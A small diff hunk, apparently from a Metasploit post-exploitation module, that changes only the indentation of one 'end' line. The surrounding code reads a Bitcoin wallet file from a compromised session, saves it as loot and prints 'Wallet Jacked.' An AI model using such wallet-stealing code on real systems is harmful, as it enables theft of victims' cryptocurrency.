@@ -53,7 +53,7 @@ class Metasploit3 < Msf::Post
 			wallet = session.fs.file.new(filename, "rb")
 			until wallet.eof?
 				data << wallet.read
- 			end
+			end
 			
 			store_loot("bitcoin.wallet", "application/octet-stream", session, data, filename, "Bitcoin Wallet")
 			print_status("     Wallet Jacked.")
